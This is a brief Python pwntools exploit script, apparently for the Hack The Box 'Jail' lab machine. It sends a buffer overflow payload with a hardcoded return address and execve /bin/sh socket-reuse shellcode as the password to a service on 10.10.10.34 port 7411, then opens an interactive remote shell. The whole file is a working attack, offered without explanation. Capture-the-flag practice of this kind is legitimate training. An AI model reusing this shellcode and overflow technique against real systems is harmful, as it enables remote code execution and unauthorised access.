#!/usr/bin/python
#Exploit for the HTB jail machine 
from pwn import *
# Linux/x86 - execve(/bin/sh) + Socket Re-Use Shellcode (50 bytes) https://www.exploit-db.com/exploits/34060/
shellcode = '\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
payload = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA' + '\x30\xd6\xff\xff' + shellcode
r = remote('10.10.10.34', 7411)
print r.recv(1024)
r.sendline('USER admin')
print r.recv(1024)
r.sendline('PASS ' + payload)
r.interactive()
